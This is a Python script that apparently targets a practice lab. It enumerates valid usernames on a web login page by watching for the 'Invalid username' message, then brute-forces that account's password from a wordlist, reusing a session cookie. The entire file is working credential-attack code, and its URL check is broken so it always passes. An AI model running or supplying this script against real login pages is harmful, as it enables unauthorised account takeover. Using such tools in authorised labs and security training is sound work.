#!/bin/python3

import urllib3, requests, re, logging
from sys import exit
from pyinputplus import inputURL
logging.basicConfig(level=logging.WARNING, format='line-%(lineno)d, message string- %(message)s')

url = inputURL("Enter URL : ", limit=5, timeout=120)

# logging.disable(logging.INFO)
#url should have the login keyword else add login key-word in the last
pattern = re.compile(r'[^\s]*[^login][^\s]/login$')
istherelogin = pattern.match(url)


if istherelogin!='None':
    # now we need to establish and get session cookies:
    get_session = requests.get(url)
    get_cookies = get_session.headers['Set-Cookie']
    session_cookie = get_cookies.split(';')[0]

    # session cookie extracted
    headers = {
        "Cookie": session_cookie
    }
    https = urllib3.PoolManager()
    
    username_file = open('./usernames.txt', 'r')
    password_file = open('./passwords.txt', 'r')

    labUser = ""
    labPassword = ""

    # first we need to find valid username 
    for username in enumerate(username_file):
        payload_string = f"username={username[1][:-1]}&password=admin"
        response = https.request('POST', url, body=payload_string, headers=headers)
        
        # show string trying usernames
        print(f"trying usernames : {username[1][:-1]: <25} : status code - {response.status : <10}", end='\r')
        if (str(response.data).find("Invalid username") == -1):
            labUser = username[1][:-1]
            break


    https = urllib3.PoolManager()

    for password in enumerate(password_file):
        payload_string = f"username={labUser}&password={password[1][:-1]}"
        response = https.request('POST', url, body=payload_string, headers=headers, redirect=False)
        
        # show string trying passwords
        print(f"trying password against Username \"{labUser}\" : {password[1][:-1]: <25} : status code - {response.status : <10}" , end = "\r")
        if(str(response.data).find("Incorrect password") == -1):
            labPassword = password[1][:-1]
            break

    """
    print(f"password found : {labPassword}")
    """
    print(f"username found : {labUser: <100}\npassword found = {labPassword}")

    username_file.close()
    password_file.close()

else :
    print("Please check the URL entered")
    exit